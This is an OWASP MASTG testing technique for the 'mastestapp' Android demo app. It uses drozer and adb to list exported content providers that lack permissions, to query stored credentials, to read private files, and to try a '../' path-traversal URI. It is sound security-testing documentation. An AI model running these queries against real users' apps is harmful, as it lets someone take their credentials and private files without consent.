---
title: Retrieving Sensitive Stored Data from Exported Content Providers
platform: android
---

This technique involves identifying and querying exported content providers that do not have proper access controls, allowing an attacker to retrieve sensitive information stored within the application's database or files. The workflow below is based on the vulnerable `org.owasp.mastestapp` demo (`0x07IP`), where one provider returns credential rows from an internal SQLite database and another provider exposes files from the app's private `filesDir`.

## Using the AndroidManifest

Inspect `AndroidManifest.xml` and identify exported `<provider>` elements. Review whether they define `android:permission`, `android:readPermission`, or `android:writePermission`.

In the vulnerable demo, both providers are exported and have no access restrictions:

```xml
<provider
    android:name="org.owasp.mastestapp.CredentialProvider"
    android:authorities="org.owasp.mastestapp.credentials"
    android:exported="true" />

<provider
    android:name="org.owasp.mastestapp.FileLeakProvider"
    android:authorities="org.owasp.mastestapp.files"
    android:exported="true" />
```

If the provider reads from an internal database or serves files from private storage, treat missing restrictions as a high-value review target.

## Using @MASTG-TOOL-0015

Use drozer to enumerate the package attack surface and inspect provider metadata from outside the app process.

```bash
$ dz> run app.package.attacksurface org.owasp.mastestapp
Attack Surface:
  2 providers exported
```

```bash
$ dz> run app.provider.info -a org.owasp.mastestapp
Package: org.owasp.mastestapp
  Authority: org.owasp.mastestapp.credentials
    Read Permission: null
    Write Permission: null
    Content Provider: org.owasp.mastestapp.CredentialProvider
  Authority: org.owasp.mastestapp.files
    Read Permission: null
    Write Permission: null
    Content Provider: org.owasp.mastestapp.FileLeakProvider
```

Once the attack surface is confirmed, query the database-backed provider:

```bash
$ dz> run app.provider.query content://org.owasp.mastestapp.credentials/credentials
| _id | username | password       | note         |
| 1   | admin    | StrongPwd!2026 | prod account |
| 2   | test     | test1234       | dev account  |
```

Read the file-backed provider:

```bash
$ dz> run app.provider.read content://org.owasp.mastestapp.files/files/secret.txt
TOP_SECRET_TOKEN=tok_live_12345
PIN=9876
```

Test whether file access is also vulnerable to traversal:

```bash
$ dz> run app.provider.read content://org.owasp.mastestapp.files/files/../databases/creds.db
```

Successful access to these URIs confirms that sensitive stored data can be retrieved over IPC by an external caller.

## Using @MASTG-TOOL-0004

`adb shell content` can reproduce the same behavior without drozer.

Query the credential provider:

```bash
$ adb shell content query --uri content://org.owasp.mastestapp.credentials/credentials
Row: 0 _id=1, username=admin, password=StrongPwd!2026, note=prod account
Row: 1 _id=2, username=test, password=test1234, note=dev account
```

Read the internal file through the file-backed provider:

```bash
$ adb shell content read --uri content://org.owasp.mastestapp.files/files/secret.txt
TOP_SECRET_TOKEN=tok_live_12345
PIN=9876
```

If an external caller can retrieve credential rows, tokens, PINs, or internal files through these provider URIs, the app demonstrates the vulnerable pattern covered by @MASTG-TEST-0007.
